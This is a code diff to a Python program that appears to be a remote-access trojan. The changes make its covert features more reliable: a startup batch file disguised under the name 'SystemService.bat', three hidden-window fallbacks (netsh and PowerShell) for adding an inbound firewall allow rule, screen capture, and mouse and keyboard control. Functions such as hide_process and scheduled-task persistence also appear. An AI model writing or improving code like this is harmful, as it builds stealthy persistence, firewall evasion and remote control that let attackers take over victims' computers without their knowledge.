@@ -1354,20 +1354,38 @@ def startup_folder_persistence():
         # Get startup folder path
         startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
         
+        # Check if startup folder exists and is writable
+        if not os.path.exists(startup_folder):
+            print(f"[WARN] Startup folder does not exist: {startup_folder}")
+            return False
+        
+        if not os.access(startup_folder, os.W_OK):
+            print(f"[WARN] No write permission to startup folder: {startup_folder}")
+            return False
+        
         current_exe = os.path.abspath(__file__)
         
         if current_exe.endswith('.py'):
-            # Create batch file wrapper
+            # Create batch file wrapper with better error handling
             batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
-            batch_path = os.path.join(startup_folder, "WindowsUpdate.bat")
+            batch_path = os.path.join(startup_folder, "SystemService.bat")
             
-            with open(batch_path, 'w') as f:
-                f.write(batch_content)
+            try:
+                with open(batch_path, 'w') as f:
+                    f.write(batch_content)
+                print(f"[OK] Startup folder entry created: {batch_path}")
+                return True
+            except PermissionError:
+                print(f"[WARN] Permission denied creating startup folder entry: {batch_path}")
+                return False
+            except Exception as e:
+                print(f"[WARN] Error creating startup folder entry: {e}")
+                return False
         
         return True
         
     except Exception as e:
-        print(f"Startup folder persistence failed: {e}")
+        print(f"[WARN] Startup folder persistence failed: {e}")
         return False
 
 def scheduled_task_persistence():
@@ -1889,19 +1907,61 @@ def add_firewall_exception():
         return False
     
     try:
+        # Get the current executable path
         current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
         
-        subprocess.run([
-            'netsh', 'advfirewall', 'firewall', 'add', 'rule',
-            f'name="Python Agent {uuid.uuid4()}"',
-            'dir=in', 'action=allow',
-            f'program="{current_exe}"'
-        ], creationflags=subprocess.CREATE_NO_WINDOW, check=True)
+        # Create a unique rule name
+        rule_name = f"Python Agent {uuid.uuid4()}"
         
-        return True
+        # Try multiple approaches for firewall exception
+        success = False
+        
+        # Method 1: Try with full path and proper escaping
+        try:
+            subprocess.run([
+                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                f'name={rule_name}',
+                'dir=in', 'action=allow',
+                f'program={current_exe}'
+            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+            success = True
+            print(f"[OK] Firewall exception added: {rule_name}")
+        except subprocess.CalledProcessError as e:
+            print(f"[WARN] Method 1 failed: {e}")
+        
+        # Method 2: Try with just python.exe if Method 1 failed
+        if not success:
+            try:
+                subprocess.run([
+                    'netsh', 'advfirewall', 'firewall', 'add', 'rule',
+                    f'name={rule_name}',
+                    'dir=in', 'action=allow',
+                    'program=python.exe'
+                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+                success = True
+                print(f"[OK] Firewall exception added (python.exe): {rule_name}")
+            except subprocess.CalledProcessError as e:
+                print(f"[WARN] Method 2 failed: {e}")
+        
+        # Method 3: Try with PowerShell if netsh fails
+        if not success:
+            try:
+                powershell_cmd = f'New-NetFirewallRule -DisplayName "{rule_name}" -Direction Inbound -Action Allow -Program "python.exe"'
+                subprocess.run([
+                    'powershell.exe', '-Command', powershell_cmd
+                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
+                success = True
+                print(f"[OK] Firewall exception added via PowerShell: {rule_name}")
+            except subprocess.CalledProcessError as e:
+                print(f"[WARN] Method 3 failed: {e}")
+        
+        if not success:
+            print("[WARN] All firewall exception methods failed. Continuing without firewall exception.")
+        
+        return success
         
     except Exception as e:
-        print(f"Failed to add firewall exception: {e}")
+        print(f"[ERROR] Failed to add firewall exception: {e}")
         return False
 
 def hide_process():
@@ -3683,7 +3743,12 @@ class HighPerformanceCapture:
         # Initialize compression
         self.turbo_jpeg = None
         if HAS_TURBOJPEG:
-            self.turbo_jpeg = TurboJPEG()
+            try:
+                self.turbo_jpeg = TurboJPEG()
+                print(f"[OK] TurboJPEG initialized successfully")
+            except Exception as e:
+                print(f"[WARN] Failed to initialize TurboJPEG: {e}")
+                self.turbo_jpeg = None
         
         # Frame management
         self.last_frame = None
@@ -3894,13 +3959,17 @@ class HighPerformanceCapture:
     
     def __del__(self):
         """Cleanup"""
-        self.stop_capture_stream()
-        if hasattr(self, 'capture_backend') and self.backend_type == "dxcam":
-            try:
-                if hasattr(self.capture_backend, 'release'):
-                    self.capture_backend.release()
-            except:
-                pass
+        try:
+            if hasattr(self, 'capture_thread') and self.capture_thread:
+                self.stop_capture_stream()
+            if hasattr(self, 'capture_backend') and hasattr(self, 'backend_type') and self.backend_type == "dxcam":
+                try:
+                    if hasattr(self.capture_backend, 'release'):
+                        self.capture_backend.release()
+                except:
+                    pass
+        except:
+            pass  # Ignore cleanup errors during destruction
 
 
 class AdaptiveQualityManager:
@@ -5842,9 +5911,11 @@ def initialize_components():
     try:
         mouse_controller = pynput.mouse.Controller()
         keyboard_controller = pynput.keyboard.Controller()
-        print("Input controllers initialized")
+        print("[OK] Input controllers initialized")
     except Exception as e:
-        print(f"Failed to initialize input controllers: {e}")
+        print(f"[WARN] Failed to initialize input controllers: {e}")
+        mouse_controller = None
+        keyboard_controller = None
     
     # Initialize high-performance capture
     try:
@@ -5853,18 +5924,18 @@ def initialize_components():
             quality=85,
             enable_delta_compression=True
         )
-        print("High-performance capture initialized")
+        print("[OK] High-performance capture initialized")
     except Exception as e:
-        print(f"Failed to initialize high-performance capture: {e}")
+        print(f"[WARN] Failed to initialize high-performance capture: {e}")
         high_performance_capture = None
     
     # Initialize low-latency input handler
     try:
         low_latency_input = LowLatencyInputHandler()
         low_latency_input.start()
-        print("Low-latency input handler initialized")
+        print("[OK] Low-latency input handler initialized")
     except Exception as e:
-        print(f"Failed to initialize low-latency input: {e}")
+        print(f"[WARN] Failed to initialize low-latency input: {e}")
         low_latency_input = None
 
 def add_to_startup():
